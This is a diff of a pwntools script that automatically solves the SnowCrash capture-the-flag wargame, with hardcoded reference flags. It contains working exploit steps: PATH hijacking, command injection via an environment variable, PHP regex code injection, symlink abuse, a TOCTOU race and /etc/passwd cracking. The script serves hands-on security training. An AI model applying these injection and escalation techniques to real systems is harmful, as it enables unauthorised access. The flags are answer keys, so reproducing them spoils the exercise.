@@ -23,54 +23,59 @@ ref_flags = [
     "2A31L79asukciNyi8uppkEuSx",
     "7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ",
 ]
-# rhost = "192.168.56.104"
 rhost = "SnowCrash"
 rport = 4242
 
 
-def rot_alpha(n):
-    from string import ascii_lowercase as lc, ascii_uppercase as uc, maketrans
-
-    lookup = maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
-    return lambda s: s.translate(lookup)
-
-
 def add_flag(res, check):
+    global flags
     if res is not None:
         match = flag_reg.search(res)
         if match is not None and match.group(0) is not None and "AAAAA" not in match.group(0):
             found = match.group(0)
             flags.append(found)
-            flags_idx = flags.index(found)
-            with context.local(log_level="WARNING"):
-                log.warn("Level%(idx)02d - Found flag%(idx)02d: %(fl)s" % {"idx": flags_idx, "fl": found})
+            with open("level{:02d}/flag".format(check), "w+") as fw:
+                fw.write(found + "\n")
+            with context.local(log_level="INFO"):
+                log.success("Level{0:02d} - Found flag{0:02d}: {1}".format(check, found))
 
 
 def get_flag_as_user(shell, usr, passwd):
     pr = shell.run("su " + usr)
     pr.sendlineafter("Password: ", passwd)
+    with context.local(log_level="INFO"):
+        pr.recvline()
+        ln = pr.recvline()
+        if "Don't forget to launch getflag !" not in ln:
+            log.info(ln)
     pr.sendlineafter(usr + "@SnowCrash:~$ ", "getflag")
-    ret = pr.recvline(keepends=False)
+    add_flag(pr.recvline(keepends=False), int(usr[-2:]))
     pr.close()
-    add_flag(ret, int(usr[-2:]))
 
 
 # level00@SnowCrash
 # find any interesting files and get 'em
+# very rudimentary monoalphabetic substution cipher
 def level00():
+
+    def rot_alpha(n):
+        from string import ascii_lowercase as lc, ascii_uppercase as uc, maketrans
+        lookup = maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
+        return lambda s: s.translate(lookup)
+
     sh = ssh("level00", rhost, password="level00", port=rport)
     johnpath = sh["find / -user flag00 2>/dev/null"].splitlines()[0]
     john = sh["cat " + johnpath]
     hnjo = rot_alpha(11)(john)
-    with context.local(log_level="WARNING"):
-        log.warn("Level00 - %s -> %s" % (john, hnjo))
+    with context.local(log_level="INFO"):
+        log.success("Level00 - rot11({}) -> {}".format(john, hnjo))
     get_flag_as_user(sh, "flag00", hnjo)
-    sh["exit"]
     sh.close()
 
 
 # level01@SnowCrash
-# descrypt, traditional crypt(3)
+# descrypt, traditional crypt(3), is not a secure type of encryption
+# JohnTheRipper makes short work of it
 def level01():
     sh = ssh("level01", rhost, password=flags[0], port=rport)
     sh["grep 'flag01' /etc/passwd > /tmp/pass"]
@@ -80,12 +85,11 @@ def level01():
     ).group(1)
     get_flag_as_user(sh, "flag01", passwd)
     process(["rm", "-f", "pass"]).recvall()
-    sh["exit"]
     sh.close()
 
 
 # level02@SnowCrash
-# pcap parsing, tshark to the rescue
+# packet capture file information extraction, tshark to the rescue
 def level02():
     sh = ssh("level02", rhost, password=flags[1], port=rport)
     sh.download_file("level02.pcap")
@@ -102,11 +106,10 @@ def level02():
     passwd = ""
     for i in [chr(int(j, 16)) for j in pckts[:-1]]:
         passwd += i
-    with context.local(log_level="WARNING"):
-        log.warn("Level02 - flag02 password: %s" % passwd)
+    with context.local(log_level="INFO"):
+        log.success("Level02 - flag02 password: {}".format(passwd))
     get_flag_as_user(sh, "flag02", passwd)
     process(["rm", "-f", "level02.pcap"]).recvall()
-    sh["exit"]
     sh.close()
 
 
@@ -116,12 +119,12 @@ def level03():
     sh = ssh("level03", rhost, password=flags[2], port=rport)
     sh["ln -s /bin/getflag /tmp/echo"]
     add_flag(sh["env PATH=/tmp:$PATH ./level03"], 3)
-    sh["rm -f /tmp/echo; exit"]
+    sh["rm -f /tmp/echo"]
     sh.close()
 
 
 # level04@SnowCrash
-# http post requests
+# http post requests, and reasons why you shouldn't use backticks in perl CGI scripts
 def level04():
     req = process(
         [
@@ -140,8 +143,22 @@ def level04():
 
 
 # level05@SnowCrash
-# cronjobs/init.rc
+# cronjobs and/or init.rc
 def level05():
+    with context.local(log_level="WARNING"):
+        from datetime import datetime
+        fmt = ""
+        now = datetime.now()
+        if now.minute % 2 == 0:
+            fmt += "1 minute"
+        tmp = 60 - now.second
+        if tmp != 0:
+            if now.minute % 2 == 0:
+                fmt += " and "
+            fmt += "{} second".format(tmp)
+            if tmp != 1:
+                fmt += "s"
+        log.warning("Should complete in {}".format(fmt))
     sh = ssh("level05", rhost, password=flags[4], port=rport)
     res = sh[
         "rm -f /tmp/flag;"
@@ -150,55 +167,59 @@ def level05():
         "while true; do if [ -f /tmp/flag ]; then cat /tmp/flag; exit; fi; done"
     ]
     add_flag(res, 5)
-    sh["rm -f /tmp/flag; exit"]
+    sh["rm -f /tmp/flag"]
     sh.close()
 
 
 # level06@SnowCrash
+# horrendous php regular expressions
+# also seems to be just a slightly obfuscated carbon copy of a level from Protostar
 def level06():
     sh = ssh("level06", rhost, password=flags[5], port=rport)
     res = sh["echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument"]
     add_flag(res, 6)
-    sh["rm -f /tmp/arg; exit"]
+    sh["rm -f /tmp/arg"]
     sh.close()
 
 
 # level07@SnowCrash
+# environment variable exploit
 def level07():
     sh = ssh("level07", rhost, password=flags[6], port=rport)
     res = sh["env LOGNAME=\;getflag ./level07"]
     add_flag(res, 7)
-    sh["exit"]
     sh.close()
 
 
 # level08@SnowCrash
+# symlink permission abuse
 def level08():
     sh = ssh("level08", rhost, password=flags[7], port=rport)
     passwd = sh["ln -fs $HOME/token /tmp/test; ./level08 /tmp/test"]
-    with context.local(log_level="WARNING"):
-        log.warn("Level08 - flag08 password: %s" % passwd)
+    with context.local(log_level="INFO"):
+        log.success("Level08 - flag08 password: {}".format(passwd))
     get_flag_as_user(sh, "flag08", passwd)
-    sh["rm -f /tmp/test; exit"]
+    sh["rm -f /tmp/test"]
     sh.close()
 
 
 # level09@SnowCrash
+# simple substitution cipher based on index of char in string
 def level09():
     sh = ssh("level09", rhost, password=flags[8], port=rport)
     token = sh.download_data("token")
     passwd = ""
     for i in xrange(len(token) - 1):
         passwd += chr(ord(token[i]) - i)
-    with context.local(log_level="WARNING"):
-        log.warn("Level09 - flag09 password: %s" % passwd)
+    with context.local(log_level="INFO"):
+        log.success("Level09 - flag09 password: {}".format(passwd))
     get_flag_as_user(sh, "flag09", passwd)
     sh["exit"]
     sh.close()
 
 
 # level10@SnowCrash
-# TOCTOU
+# TOCTOU or Time Of Check Time Of Use exploit
 def level10():
     sh = ssh("level10", rhost, password=flags[9], port=rport)
     m = None
@@ -224,10 +245,10 @@ def level10():
         res = p.recv()
         m = flag_reg.search(res)
     passwd = m.group(0)
-    with context.local(log_level="WARNING"):
-        log.warn("Level10 - flag10 password: %s" % passwd)
+    with context.local(log_level="INFO"):
+        log.success("Level10 - flag10 password: {}".format(passwd))
     get_flag_as_user(sh, "flag10", passwd)
-    sh["rm -f /tmp/flog /tmp/l10 /tmp/honk.sh /tmp/a; exit"]
+    sh["rm -f /tmp/flog /tmp/l10 /tmp/honk.sh /tmp/a"]
     sh.close()
 
 
@@ -239,12 +260,12 @@ def level11():
     p.close()
     res = sh["cat /tmp/flag11"]
     add_flag(res, 11)
-    sh["rm -f /tmp/flag11; exit"]
+    sh["rm -f /tmp/flag11"]
     sh.close()
 
 
 # level12@SnowCrash
-# perl CGI unsanitized inputs
+# perl CGI script with partially sanitized inputs
 def level12():
     sh = ssh("level12", rhost, password=flags[11], port=rport)
     sh[
@@ -255,12 +276,12 @@ def level12():
     ]
     res = sh["cat /tmp/glag"]
     add_flag(res, 12)
-    sh["rm -f /tmp/glag /tmp/GONK; exit"]
+    sh["rm -f /tmp/glag /tmp/GONK"]
     sh.close()
 
 
 # level13@SnowCrash
-# patching bytes my scungle
+# patching bytes in a binary
 def level13():
     sh = ssh("level13", rhost, password=flags[12], port=rport)
     res = sh[
@@ -275,7 +296,7 @@ def level13():
         "/tmp/goat"
     ]
     add_flag(res, 13)
-    sh["rm -f /tmp/level13 /tmp/goat; exit"]
+    sh["rm -f /tmp/level13 /tmp/goat"]
     sh.close()
 
 
@@ -310,12 +331,12 @@ def level14():
     token = sh["strings /bin/getflag | egrep '^[[:print:]]{39}$'"]
     passwd = ft_des(token)
     get_flag_as_user(sh, "flag14", passwd)
-    sh["exit"]
     sh.close()
 
 
 def main(args):
     # init
+    global flags
     usage = "Usage: %s [0-14]" % args[0]
     num = None
     if len(args) == 2:
@@ -344,11 +365,11 @@ def main(args):
         level13,
         level14,
     ]
-    if num:
+    if num is not None:
         try:
             funs[num]()
         except Exception as e:
-            print "Error: argument out of range: %r" % num
+            print "Error: argument out of range: {}".format(e)
             print usage
             exit(1)
     else:
